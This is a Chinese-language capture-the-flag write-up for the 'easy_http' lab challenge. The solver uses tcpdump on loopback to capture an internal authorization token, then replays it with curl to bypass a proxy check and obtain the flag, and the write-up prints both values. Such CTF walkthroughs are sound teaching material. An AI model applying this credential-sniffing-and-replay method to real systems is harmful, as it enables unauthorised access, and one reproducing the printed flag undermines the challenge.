# easy_http

## 题解

根据提示访问 `http://127.79.0.1`。

```log
/rknazo/chal/06-easy_http # curl http://127.79.0.1
You can access the flag via '/flag'.
你可以通过访问 '/flag' 获得 flag.
```

根据给出的提示访问 `http://127.79.0.1/flag`

```log
/rknazo/chal/06-easy_http # curl http://127.79.0.1/flag
Proxy detected.
检测到了代理.
```

看到 “检测到了代理” 可能会比较疑惑，看到 `tips.txt` 给出的提示中说 “可能日志能帮助你解题, 日志就丢在大家都喜欢丢的地方”，可去寻找日志。

细心的人可能在做题之前看到过 `/rknazo/run.py` 中有对日志路径的定义:

```python
LOGDIR = "/var/log/rknazo"
```

就算没看到也能通过 “日志就丢在大家都喜欢丢的地方” 猜测出日志在 `/var/log` 下。

通过查看日志文件 `/var/log/rknazo/easy_http-stdout.log`，可看到前面访问内部处理过程。

通过对日志的简要分析，可得出以下信息:

1. `http://127.79.0.1` 对应的 Proxy 应用；`http://127.79.0.68` 对应为 Notifier 应用
2. 用户访问 `http://127.79.0.1/` 之后 Proxy 应用向 Notifier 应用请求创建 Real server 应用
3. 随后 Proxy 应用向创建获得的 Real server 地址传输用户的请求
4. Proxy 应用将从 Real server 返回的数据回传给用户
5. Real server 在 10 秒后或者收到数据后被销毁

此时可尝试访问 `http://127.79.0.68/`，可发现服务器回传了 “Authorization needed. 需要认证.”。

此时可尝试利用 `tcpdump` 工具抓取中间传输的信息。

访问 `http://127.79.0.1/`，对 `tcpdump` 输出进行精简可得到以下内容:

```log
# tcpdump -i lo -A
localhost.35732 > 127.79.0.1.80:
GET / HTTP/1.1
Host: 127.79.0.1
User-Agent: curl/8.11.1
Accept: */*

localhost.58186 > 127.79.0.68.80:
GET /create HTTP/1.1
host: 127.79.0.68:80
authorization: rknazo{1t's-@-GI@NT-St3p-to-f1nd-1t!}

127.79.0.68.80 > localhost.58186:
HTTP/1.1 200 OK
content-length: 18
date: Tue, 31 Dec 2024 10:53:08 GMT

127.79.169.61:9754

localhost.35438 > 127.79.169.61.9754:
GET / HTTP/1.1
host: 127.79.169.61:9754
user-agent: curl/8.11.1
accept: */*
from: proxy@rknazo

127.79.169.61.9754 > localhost.35438:
HTTP/1.1 200 OK
content-length: 79
date: Tue, 31 Dec 2024 10:53:08 GMT

You can access the flag via '/flag'.
```

可发现 Proxy 在请求 Real server 时带上了 `from: proxy@rknazo`，而 Real server 对 `from` Header 进行了检测，从而检测到了代理而拒绝发送 flag。

通过上面获取到的数据包可以得到访问 Notifier 服务所需的认证字段 `authorization: rknazo{1t's-@-GI@NT-St3p-to-f1nd-1t!}`，于是可以模拟上述过程获得 flag。

```log
/rknazo/chal/06-easy_http # curl http://127.79.0.68/create --header "authorization: rknazo{1t's-@-GI@NT-St3p-to-f1nd-1t!}"
127.79.3.24:50526

/rknazo/chal/06-easy_http # curl http://127.79.3.24:50526/flag
flag{96ed0668-a328-013b-fa06-060f09f1045b}
```
